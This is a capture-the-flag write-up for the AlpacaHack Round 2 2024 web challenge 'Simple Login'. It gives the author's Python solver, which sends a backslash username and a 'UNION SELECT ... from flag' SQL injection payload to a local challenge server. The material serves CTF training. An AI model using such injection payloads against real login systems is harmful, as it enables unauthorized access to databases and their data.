---
title: "Simple Login - AlpacaHack Round 2 2024"
category: "web"
type: "writeup"
tags: ["arkark-my-ctf-challenges", "author-solution", "challenge-source", "union-select", "simple", "login", "web", "alpacahack-round-2"]
summary: "A simple login service :)"
source:
  name: "arkark/my-ctf-challenges"
  url: "https://github.com/arkark/my-ctf-challenges/tree/325bbde6aaf1b2b2d07f3ddedf734094af81ec94/challenges/202409_AlpacaHack_Round_2/web/simple-login"
license: "none stated"
ctf:
  name: "AlpacaHack Round 2"
  year: 2024
  challenge: "Simple Login"
---

## Challenge

- **Author:** [arkark](https://github.com/arkark)
- **Source:** <https://github.com/arkark/my-ctf-challenges/tree/325bbde6aaf1b2b2d07f3ddedf734094af81ec94/challenges/202409_AlpacaHack_Round_2/web/simple-login>
- **CTF:** AlpacaHack Round 2 2024

---

# [web] Simple Login

## Description

A simple login service :)

## Attachments

- [simple-login](distfiles)

## Usage

Launch a challenge server:

```
cd challenge
docker compose up
```


## Solver: `solve.py`

<https://github.com/arkark/my-ctf-challenges/blob/325bbde6aaf1b2b2d07f3ddedf734094af81ec94/challenges/202409_AlpacaHack_Round_2/web/simple-login/solution/solve.py>

```python
import os
import httpx

HOST = os.getenv("HOST", "localhost")
PORT = int(os.getenv("PORT", 3000))

client = httpx.Client(base_url=f"http://{HOST}:{PORT}")

res = client.post(
    "/login",
    data={
        "username": "\\",
        "password": "UNION SELECT value, value from flag -- ",
    },
    follow_redirects=True,
)
print(res.text)
```
